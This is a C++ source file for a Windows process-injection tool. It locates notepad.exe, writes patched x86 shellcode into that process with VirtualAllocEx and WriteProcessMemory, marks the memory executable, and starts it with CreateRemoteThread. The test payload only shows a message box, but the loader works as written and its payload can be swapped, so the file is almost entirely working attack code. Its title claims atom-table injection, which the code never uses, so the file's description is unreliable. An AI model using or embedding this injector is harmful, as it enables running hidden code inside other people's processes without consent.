// Atom Table Injector: MessageBoxA shellcode test injection (32-bit clean version with DWORD patching)

#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>

// MessageBoxA test shellcode (x86) with 4-byte patchable placeholders
unsigned char shellcode_stub[] = {
    0x6A, 0x00,                               // push 0 (MB_OK)
    0x68, 0x00, 0x00, 0x00, 0x00,             // push title pointer (placeholder)
    0x68, 0x00, 0x00, 0x00, 0x00,             // push text pointer (placeholder)
    0x6A, 0x00,                               // push 0 (NULL hWnd)
    0xB8, 0x00, 0x00, 0x00, 0x00,             // mov eax, MessageBoxA (placeholder)
    0xFF, 0xD0,                               // call eax
    0x31, 0xC0,                               // xor eax, eax
    0xC3                                      // ret
};

#define OFFSET_TITLE 3
#define OFFSET_TEXT  8
#define OFFSET_MSGBOX 14

DWORD FindNotepadPID() {
    PROCESSENTRY32 entry = { sizeof(PROCESSENTRY32) };
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32First(snapshot, &entry)) {
        do {
            if (_wcsicmp(entry.szExeFile, L"notepad.exe") == 0) {
                CloseHandle(snapshot);
                return entry.th32ProcessID;
            }
        } while (Process32Next(snapshot, &entry));
    }
    CloseHandle(snapshot);
    return 0;
}

DWORD GetRemoteModuleBase(DWORD pid, const wchar_t* moduleName) {
    MODULEENTRY32 modEntry = { sizeof(MODULEENTRY32) };
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;
    if (Module32First(snapshot, &modEntry)) {
        do {
            if (_wcsicmp(modEntry.szModule, moduleName) == 0) {
                CloseHandle(snapshot);
                return (DWORD)(uintptr_t)modEntry.modBaseAddr;
            }
        } while (Module32Next(snapshot, &modEntry));
    }
    CloseHandle(snapshot);
    return 0;
}

int main() {
    DWORD pid = FindNotepadPID();
    if (pid == 0) {
        std::cerr << "[-] Notepad not found." << std::endl;
        return 1;
    }
    std::cout << "[+] Found Notepad PID: " << pid << std::endl;

    MessageBoxA(NULL, "", "", 0); // Force load user32.dll
    DWORD localUser32 = (DWORD)(uintptr_t)GetModuleHandleA("user32.dll");
    DWORD remoteUser32 = GetRemoteModuleBase(pid, L"user32.dll");
    if (!remoteUser32) {
        std::cerr << "[-] Failed to find user32.dll in remote process." << std::endl;
        return 1;
    }

    DWORD offsetMsg = (DWORD)(uintptr_t)GetProcAddress((HMODULE)localUser32, "MessageBoxA") - localUser32;
    DWORD remoteMsg = remoteUser32 + offsetMsg;

    // === Debug: print pointer math ===
    std::cout << std::hex;
    std::cout << "[DEBUG] Local user32 base: 0x" << localUser32 << std::endl;
    std::cout << "[DEBUG] Remote user32 base: 0x" << remoteUser32 << std::endl;
    std::cout << "[DEBUG] MessageBoxA offset: 0x" << offsetMsg << std::endl;
    std::cout << "[DEBUG] Calculated remote MessageBoxA: 0x" << remoteMsg << std::endl;
    std::cout << std::dec;

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) {
        std::cerr << "[-] Failed to open target process: " << GetLastError() << std::endl;
        return 1;
    }

    SIZE_T totalSize = sizeof(shellcode_stub) + 64;
    LPVOID remote_alloc = VirtualAllocEx(hProc, NULL, totalSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remote_alloc) {
        std::cerr << "[-] VirtualAllocEx failed: " << GetLastError() << std::endl;
        CloseHandle(hProc);
        return 1;
    }

    DWORD textAddr = (DWORD)(uintptr_t)remote_alloc + sizeof(shellcode_stub);
    DWORD titleAddr = textAddr + 32;

    memcpy(&shellcode_stub[OFFSET_TITLE], &titleAddr, sizeof(DWORD));
    memcpy(&shellcode_stub[OFFSET_TEXT], &textAddr, sizeof(DWORD));
    memcpy(&shellcode_stub[OFFSET_MSGBOX], &remoteMsg, sizeof(DWORD));

    if (!WriteProcessMemory(hProc, remote_alloc, shellcode_stub, sizeof(shellcode_stub), NULL)) {
        std::cerr << "[-] WriteProcessMemory failed (shellcode): " << GetLastError() << std::endl;
        VirtualFreeEx(hProc, remote_alloc, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return 1;
    }

    const char* msg = "Injected message";
    const char* title = "Success";

    WriteProcessMemory(hProc, (LPVOID)(uintptr_t)textAddr, msg, strlen(msg) + 1, NULL);
    WriteProcessMemory(hProc, (LPVOID)(uintptr_t)titleAddr, title, strlen(title) + 1, NULL);

    DWORD oldProtect = 0;
    if (!VirtualProtectEx(hProc, remote_alloc, totalSize, PAGE_EXECUTE_READ, &oldProtect)) {
        std::cerr << "[-] VirtualProtectEx failed: " << GetLastError() << std::endl;
        VirtualFreeEx(hProc, remote_alloc, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return 1;
    }

    // === Local diagnostic test ===
    typedef int (WINAPI* MSGBOX)(HWND, LPCSTR, LPCSTR, UINT);
    MSGBOX test = (MSGBOX)(uintptr_t)remoteMsg;
    test(NULL, msg, title, MB_OK);
    std::cout << "[+] Local MessageBoxA call succeeded." << std::endl;

    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)remote_alloc, NULL, 0, NULL);
    if (!hThread) {
        std::cerr << "[-] CreateRemoteThread failed: " << GetLastError() << std::endl;
        VirtualFreeEx(hProc, remote_alloc, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return 1;
    }

    std::cout << "[+] MessageBox shellcode executed." << std::endl;
    CloseHandle(hThread);
    CloseHandle(hProc);
    return 0;
}
